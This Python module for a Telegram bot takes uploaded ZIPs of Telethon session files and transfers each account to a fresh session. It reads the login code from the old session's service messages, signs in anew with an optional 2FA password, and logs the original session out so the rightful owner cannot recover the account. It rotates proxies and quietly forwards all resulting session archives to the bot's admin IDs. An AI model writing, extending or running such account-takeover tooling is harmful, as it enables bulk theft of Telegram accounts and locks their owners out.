import os
import zipfile
import shutil
import asyncio
import tempfile
import time
import json
import re
import random
from datetime import datetime
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
import logging
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from dotenv import load_dotenv

load_dotenv()
logger = logging.getLogger(__name__)

PREVENT_RECOVERY_BACK = os.getenv("PREVENT_RECOVERY_BACK", "").replace('\\n', '\n')

FANGZHAOHUI_API_ID = 2040
FANGZHAOHUI_API_HASH = "b18441a1ff607e10a989891a5462e627"

ADMIN_ID = os.getenv("ADMIN_ID", "")
MAX_EXTRACT_SIZE = int(os.getenv("MK_TIME", 4)) * 1024 * 1024
MAX_TASK_TIME = int(os.getenv("MK_LIST_TIME", "120").replace('S', ''))
BACK_BUTTON_EMOJI_ID = "5877629862306385808"

_proxy_list = None
_proxy_list_last_load = 0
PROXY_LIST_CACHE_TIME = 60

user_recovery_states = {}

def load_proxies():
    global _proxy_list, _proxy_list_last_load
    
    current_time = time.time()
    if _proxy_list is not None and (current_time - _proxy_list_last_load) < PROXY_LIST_CACHE_TIME:
        return _proxy_list
    
    proxy_file = "proxy.txt"
    valid_proxies = []
    
    if not os.path.exists(proxy_file):
        logger.warning("proxy.txt 文件不存在")
        _proxy_list = []
        _proxy_list_last_load = current_time
        return []
    
    try:
        with open(proxy_file, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                
                parts = line.split(':')
                if len(parts) >= 5:
                    ip, port, username, password, expire_ts = parts[:5]
                    try:
                        expire_timestamp = int(expire_ts)
                        if current_time < expire_timestamp:
                            proxy = {
                                'ip': ip,
                                'port': int(port),
                                'username': username,
                                'password': password,
                                'expire': expire_timestamp
                            }
                            valid_proxies.append(proxy)
                        else:
                            logger.debug(f"代理 {ip}:{port} 已过期")
                    except ValueError:
                        logger.warning(f"代理过期时间格式错误: {expire_ts}")
                        continue
    
    except Exception as e:
        logger.error(f"读取 proxy.txt 失败: {e}")
        _proxy_list = []
        _proxy_list_last_load = current_time
        return []
    
    _proxy_list = valid_proxies
    _proxy_list_last_load = current_time
    logger.info(f"加载了 {len(valid_proxies)} 个有效代理")
    return valid_proxies

def get_random_proxy():
    proxies = load_proxies()
    if not proxies:
        return None
    return random.choice(proxies)

def create_proxy_dict(proxy):
    return {
        'proxy_type': 'http',
        'addr': proxy['ip'],
        'port': proxy['port'],
        'username': proxy['username'],
        'password': proxy['password'],
        'rdns': True
    }

def create_back_button():
    return InlineKeyboardButton(
        "返回主菜单", 
        callback_data="back_to_main"
    ).to_dict() | {"icon_custom_emoji_id": BACK_BUTTON_EMOJI_ID}

async def show_prevent_recovery(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = str(query.from_user.id)
    await query.answer()
    
    keyboard = [[create_back_button()]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        text=PREVENT_RECOVERY_BACK,
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )
    user_recovery_states[user_id] = {"state": "waiting_zip"}

async def handle_recovery_document(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: str):
    document = update.message.document
    
    if not document.file_name.endswith('.zip'):
        await update.message.reply_text(
            "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 请上传ZIP格式的压缩包",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([[create_back_button()]])
        )
        user_recovery_states.pop(user_id, None)
        return
    
    status_msg = await update.message.reply_text(
        "<tg-emoji emoji-id='5443127283898405358'>📥</tg-emoji> 正在下载文件...",
        parse_mode='HTML'
    )
    
    zip_path = None
    extract_dir = None
    
    try:
        file = await context.bot.get_file(document.file_id)
        zip_path = f"downloads/recovery_{user_id}_{int(time.time())}.zip"
        os.makedirs("downloads", exist_ok=True)
        await file.download_to_drive(zip_path)
        
        await status_msg.edit_text(
            "<tg-emoji emoji-id='5839200986022812209'>🔍</tg-emoji> 正在解压并提取账号...",
            parse_mode='HTML'
        )
        
        extract_dir = f"downloads/recovery_extract_{user_id}_{int(time.time())}"
        os.makedirs(extract_dir, exist_ok=True)
        
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)
        
        total_size = 0
        for root, dirs, files in os.walk(extract_dir):
            for f in files:
                total_size += os.path.getsize(os.path.join(root, f))
        
        if total_size > MAX_EXTRACT_SIZE:
            raise Exception(f"解压后文件过大 ({total_size//1024//1024}MB > {MAX_EXTRACT_SIZE//1024//1024}MB)")
        
        session_files = []
        for root, dirs, files in os.walk(extract_dir):
            for file in files:
                if file.endswith('.session'):
                    session_path = os.path.join(root, file)
                    session_files.append(session_path)
        
        if not session_files:
            await update.message.reply_text(
                "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 未找到任何 .session 文件",
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup([[create_back_button()]])
            )
            user_recovery_states.pop(user_id, None)
            return
        
        user_recovery_states[user_id] = {
            "state": "waiting_2fa",
            "session_files": session_files,
            "extract_dir": extract_dir,
            "zip_path": zip_path
        }
        
        keyboard = [
            [InlineKeyboardButton("跳过2FA", callback_data="recovery_skip_2fa")],
            [create_back_button()]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"""<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> 已提取 {len(session_files)} 个账号

<tg-emoji emoji-id="6005570495603282482">🔐</tg-emoji> 请发送2FA密码（如果没有2FA，请点击“跳过2FA”按钮）：""",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        
        await status_msg.delete()
            
    except Exception as e:
        await update.message.reply_text(
            f"<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 处理失败: {str(e)}",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([[create_back_button()]])
        )
        user_recovery_states.pop(user_id, None)
        try:
            if zip_path and os.path.exists(zip_path):
                os.remove(zip_path)
            if extract_dir and os.path.exists(extract_dir):
                shutil.rmtree(extract_dir, ignore_errors=True)
        except:
            pass

async def handle_recovery_skip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = str(query.from_user.id)
    await query.answer()
    
    state_info = user_recovery_states.get(user_id)
    if not state_info or state_info.get("state") != "waiting_2fa":
        await query.edit_message_text(
            "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 会话已过期，请重新开始",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([[create_back_button()]])
        )
        return
    
    await process_recovery_task(update, context, user_id, two_fa=None)

async def handle_recovery_2fa_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    text = update.message.text.strip()
    
    state_info = user_recovery_states.get(user_id)
    if not state_info or state_info.get("state") != "waiting_2fa":
        return
    
    await process_recovery_task(update, context, user_id, two_fa=text if text else None)

async def process_recovery_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: str, two_fa: str = None):
    state_info = user_recovery_states.pop(user_id, None)
    if not state_info:
        return
    
    session_files = state_info["session_files"]
    extract_dir = state_info["extract_dir"]
    zip_path = state_info["zip_path"]
    
    status_msg = await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"""<tg-emoji emoji-id="5839200986022812209">🔄</tg-emoji> <b>防止找回任务开始</b>

总账号数: {len(session_files)}
<tg-emoji emoji-id="5775887550262546277">⏳</tg-emoji> 正在处理，请稍候...""",
        parse_mode='HTML'
    )
    
    result_temp = None
    task = None
    
    try:
        result_temp = tempfile.mkdtemp()
        
        task = asyncio.create_task(
            _process_recovery_internal(update, context, user_id, session_files, extract_dir, two_fa, status_msg, result_temp)
        )
        
        await asyncio.wait_for(task, timeout=MAX_TASK_TIME)
        
    except asyncio.TimeoutError:
        if task and not task.done():
            task.cancel()
            try:
                await task
            except:
                pass
        
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"<tg-emoji emoji-id='5778527486270770928'>⚠️</tg-emoji> 任务执行超时 ({MAX_TASK_TIME}秒)，但已完成的账号会继续发送",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([[create_back_button()]])
        )
        
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 任务执行失败: {str(e)}",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([[create_back_button()]])
        )
    finally:
        try:
            if extract_dir and os.path.exists(extract_dir):
                shutil.rmtree(extract_dir, ignore_errors=True)
            if zip_path and os.path.exists(zip_path):
                os.remove(zip_path)
            if result_temp and os.path.exists(result_temp):
                shutil.rmtree(result_temp, ignore_errors=True)
        except Exception:
            pass
        
        user_recovery_states.pop(user_id, None)

async def _process_recovery_internal(update, context, user_id, session_files, extract_dir, two_fa, status_msg, result_temp):
    success_dir = os.path.join(result_temp, "success")
    failed_dir = os.path.join(result_temp, "failed")
    os.makedirs(success_dir)
    os.makedirs(failed_dir)
    
    success_count = 0
    failed_count = 0
    results = []
    
    for idx, session_path in enumerate(session_files, 1):
        try:
            await status_msg.edit_text(
                f"""<tg-emoji emoji-id="5839200986022812209">🔄</tg-emoji> <b>防止找回任务进行中</b>

进度: {idx}/{len(session_files)}
成功: {success_count} | 失败: {failed_count}
<tg-emoji emoji-id="5775887550262546277">⏳</tg-emoji> 正在处理 {os.path.basename(session_path)}...""",
                parse_mode='HTML'
            )
        except:
            pass
        
        session_basename = os.path.basename(session_path)
        session_name = os.path.splitext(session_basename)[0]
        json_path = os.path.join(os.path.dirname(session_path), f"{session_name}.json")
        if not os.path.exists(json_path):
            json_path = None
        
        try:
            result = await process_single_account(session_path, json_path, two_fa, user_id, session_name)
        except Exception as e:
            result = {
                "session_name": session_name,
                "status": "failed",
                "message": f"异常: {str(e)[:50]}",
                "new_session_path": None,
                "new_json_path": None
            }
        
        if result["status"] == "success":
            target_dir = success_dir
            success_count += 1
            if result["new_session_path"] and os.path.exists(result["new_session_path"]):
                shutil.copy2(result["new_session_path"], os.path.join(target_dir, os.path.basename(result["new_session_path"])))
            if result["new_json_path"] and os.path.exists(result["new_json_path"]):
                shutil.copy2(result["new_json_path"], os.path.join(target_dir, os.path.basename(result["new_json_path"])))
        else:
            target_dir = failed_dir
            failed_count += 1
            if os.path.exists(session_path):
                shutil.copy2(session_path, os.path.join(target_dir, session_basename))
            if json_path and os.path.exists(json_path):
                shutil.copy2(json_path, os.path.join(target_dir, os.path.basename(json_path)))
        
        results.append(result)
        await asyncio.sleep(1)
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    success_zip = None
    failed_zip = None
    
    if success_count > 0:
        success_zip = os.path.join(result_temp, "success.zip")
        with zipfile.ZipFile(success_zip, 'w') as zipf:
            for root, dirs, files in os.walk(success_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, success_dir)
                    zipf.write(file_path, arcname)
    
    if failed_count > 0:
        failed_zip = os.path.join(result_temp, "failed.zip")
        with zipfile.ZipFile(failed_zip, 'w') as zipf:
            for root, dirs, files in os.walk(failed_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, failed_dir)
                    zipf.write(file_path, arcname)
    
    result_text = f"""<tg-emoji emoji-id="5909201569898827582">✅</tg-emoji> <b>防止找回任务完成</b>

总账号: {len(session_files)}
<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> 成功: {success_count}
<tg-emoji emoji-id="5922712343011135025">❌</tg-emoji> 失败: {failed_count}"""

    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=result_text,
        parse_mode='HTML'
    )
    
    if success_zip:
        with open(success_zip, 'rb') as f:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=f,
                filename=f"recovery_success_{timestamp}.zip",
                caption=f"<b>成功转移的账号 ({success_count}个)</b>",
                parse_mode='HTML'
            )
    
    if failed_zip:
        with open(failed_zip, 'rb') as f:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=f,
                filename=f"recovery_failed_{timestamp}.zip",
                caption=f"<b>失败的账号 ({failed_count}个)</b>",
                parse_mode='HTML'
            )
    
    if ADMIN_ID:
        for admin in ADMIN_ID.split(','):
            admin = admin.strip()
            if not admin:
                continue
            try:
                await context.bot.send_message(
                    chat_id=admin,
                    text=f"""<tg-emoji emoji-id="5909201569898827582">📢</tg-emoji> <b>防止找回任务完成</b>

用户: <code>{user_id}</code>
总账号: {len(session_files)}
<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji>成功: {success_count} |<tg-emoji emoji-id="5922712343011135025">❌</tg-emoji> 失败: {failed_count}""",
                    parse_mode='HTML'
                )
                if success_zip:
                    with open(success_zip, 'rb') as f:
                        await context.bot.send_document(chat_id=admin, document=f)
                if failed_zip:
                    with open(failed_zip, 'rb') as f:
                        await context.bot.send_document(chat_id=admin, document=f)
            except Exception as e:
                pass
    
    try:
        await status_msg.delete()
    except:
        pass

async def process_single_account(session_path, json_path, two_fa, user_id, session_name):
    result = {
        "session_name": session_name,
        "status": "failed",
        "message": "",
        "new_session_path": None,
        "new_json_path": None
    }
    
    temp_dir = tempfile.mkdtemp()
    new_session_path = os.path.join(temp_dir, f"{session_name}_new.session")
    
    client_old = None
    client_new = None
    
    try:
        if not os.path.exists(session_path):
            result["message"] = f"原session文件不存在: {session_path}"
            return result
        
        api_id_val = 2040
        api_hash_val = "b18441a1ff607e10a989891a5462e627"
        
        session_copy = os.path.join(temp_dir, f"{session_name}_copy.session")
        shutil.copy2(session_path, session_copy)
        
        proxy = get_random_proxy()
        proxy_dict = create_proxy_dict(proxy) if proxy else None
        
        client_old = TelegramClient(
            session=str(session_copy), 
            api_id=api_id_val, 
            api_hash=api_hash_val,
            proxy=proxy_dict
        )
        await client_old.connect()
        
        if not await client_old.is_user_authorized():
            result["message"] = "原session无效"
            return result
        
        me = await client_old.get_me()
        phone = me.phone
        
        proxy_new = get_random_proxy()
        proxy_dict_new = create_proxy_dict(proxy_new) if proxy_new else None
        
        client_new = TelegramClient(
            session=str(new_session_path), 
            api_id=api_id_val, 
            api_hash=api_hash_val,
            proxy=proxy_dict_new
        )
        await client_new.connect()
        
        await client_new.send_code_request(phone)
        await asyncio.sleep(8)
        
        messages = await client_old.get_messages(777000, limit=3)
        code = None
        
        for msg in messages:
            if msg.text:
                match = re.search(r'(\d{5,6})', msg.text)
                if match:
                    code = match.group(1)
                    break
        
        if not code:
            result["message"] = "未收到验证码"
            return result
        
        try:
            await client_new.sign_in(phone, code)
        except SessionPasswordNeededError:
            if two_fa:
                await client_new.sign_in(password=two_fa)
            else:
                result["message"] = "需要2FA但未提供"
                return result
        
        await client_new.get_me()
        await client_old.log_out()
        
        orig_json_data = {}
        if json_path and os.path.exists(json_path):
            try:
                with open(json_path, 'r', encoding='utf-8') as f:
                    orig_json_data = json.load(f)
            except Exception:
                pass
        
        new_json_data = {
            "api_id": orig_json_data.get("api_id", api_id_val),
            "api_hash": orig_json_data.get("api_hash", api_hash_val),
            "system_lang_code": orig_json_data.get("system_lang_code", "es-mx"),
            "lang_code": orig_json_data.get("lang_code", "id"),
            "user_id": me.id,
            "phone": phone,
            "twofa": two_fa if two_fa else "",
            "app_id": orig_json_data.get("app_id", api_id_val),
            "app_hash": orig_json_data.get("app_hash", api_hash_val),
            "session_file": f"{session_name}_new",
            "username": me.username or "",
            "ipv6": orig_json_data.get("ipv6", False),
            "pref_cat": orig_json_data.get("pref_cat", 2),
            "block": orig_json_data.get("block", False),
            "system_lang_pack": orig_json_data.get("system_lang_pack", "es-mx"),
            "premium": getattr(me, 'premium', False)
        }
        
        new_json_path = os.path.join(temp_dir, f"{session_name}_new.json")
        with open(new_json_path, 'w', encoding='utf-8') as f:
            json.dump(new_json_data, f, indent=2, ensure_ascii=False)
        
        result["status"] = "success"
        result["message"] = "成功转移"
        result["new_session_path"] = new_session_path
        result["new_json_path"] = new_json_path
        
    except Exception as e:
        result["message"] = f"错误: {str(e)[:50]}"
    finally:
        if client_old:
            await client_old.disconnect()
        if client_new:
            await client_new.disconnect()
    
    return result
